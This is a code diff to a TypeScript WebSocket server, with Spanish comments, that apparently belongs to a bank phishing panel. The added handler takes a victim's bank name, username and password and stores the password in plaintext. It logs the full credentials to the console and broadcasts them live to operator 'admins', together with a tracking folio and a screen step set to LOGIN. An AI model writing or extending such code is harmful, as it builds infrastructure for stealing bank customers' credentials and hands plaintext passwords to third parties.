@@ -1110,6 +1110,59 @@ export async function registerRoutes(app: Express): Promise<Server> {
           return;
         }
 
+        // Handle new client session creation from homepage
+        if (data.type === 'NEW_CLIENT_SESSION') {
+          try {
+            const { sessionId, banco, clientData, timestamp } = data.data;
+            
+            // Crear nueva sesión en el almacenamiento
+            const newSession = await storage.createSession({
+              id: sessionId,
+              banco: banco,
+              pasoActual: ScreenType.LOGIN,
+              folio: Math.random().toString(36).substring(2, 8).toUpperCase(),
+              active: true,
+              saved: false,
+              createdAt: new Date(),
+              // Datos del cliente que inició sesión
+              username: clientData.username,
+              password: clientData.password
+            });
+
+            console.log(`Nueva sesión de cliente creada: ${sessionId} con datos:`, clientData);
+
+            // Registrar el cliente WebSocket
+            clients.set(sessionId, ws);
+
+            // Notificar a todos los administradores sobre el nuevo cliente
+            broadcastToAdmins(JSON.stringify({
+              type: 'NEW_CLIENT_LOGIN',
+              data: {
+                sessionId,
+                banco,
+                folio: newSession.folio,
+                clientData,
+                timestamp,
+                message: `Nuevo cliente inició sesión desde la página principal`
+              }
+            }));
+
+            // Enviar confirmación al cliente
+            ws.send(JSON.stringify({
+              type: 'SESSION_CREATED',
+              data: newSession
+            }));
+            
+          } catch (error) {
+            console.error("Error creating new client session:", error);
+            ws.send(JSON.stringify({ 
+              type: 'ERROR', 
+              message: "Error al crear nueva sesión" 
+            }));
+          }
+          return;
+        }
+
         // Handle client input data
         if (data.type === 'CLIENT_INPUT') {
           try {
